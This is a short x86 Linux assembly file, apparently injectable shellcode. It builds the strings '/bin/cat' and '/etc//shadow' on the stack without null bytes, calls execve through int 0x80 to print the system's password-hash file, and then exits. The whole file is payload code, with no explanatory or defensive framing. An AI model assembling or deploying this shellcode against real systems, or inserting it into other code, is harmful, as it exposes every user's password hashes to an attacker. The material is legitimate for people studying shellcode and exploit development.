global _start
section .text

_start:

zero:
    ; Zeroing of registers
    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx
    xor edx, edx

read_shadow:
    ; [ /bin/cat | 0x00000000 ]
    push eax        ; \x00
    push "/cat"     ; /cat\x00 
    push "/bin"     ; /bin/cat\x00
    mov ebx, esp    ; ebx : /bin/cat
   
    ; [ /etc//shadow | 0x00000000 | /bin/cat | 0x00000000 ]
    push eax        ; \x00
    push "adow"     ; adow\x00
    push "//sh"     ; //shadow\x00
    push "/etc"     ; /etc//shadow\x00
    mov esi, esp    ; esi : /etc//shadow

    ; [ Address of /bin/cat | Address of /etc//shadow | 0x00000000 | /etc//shadow | 0x00000000 | /bin/cat | 0x00000000 ]
    push eax        ; \x00
    push esi        ; Address of /etc//shadow
    push ebx        ; Address of /bin/cat
    mov ecx, esp    ; ["/bin/cat","/etc/shadow"]

    mov al, 0xB     ; Syscall # for execve()
    int 0x80        ; Calls kernel

exit:
    xor eax, eax
    mov al, 0x1     ; Syscall # for exit()
    xor ebx, ebx
    mov bl, 0xFF    ; Exit code 
    int 0x80        ; Calls kernel
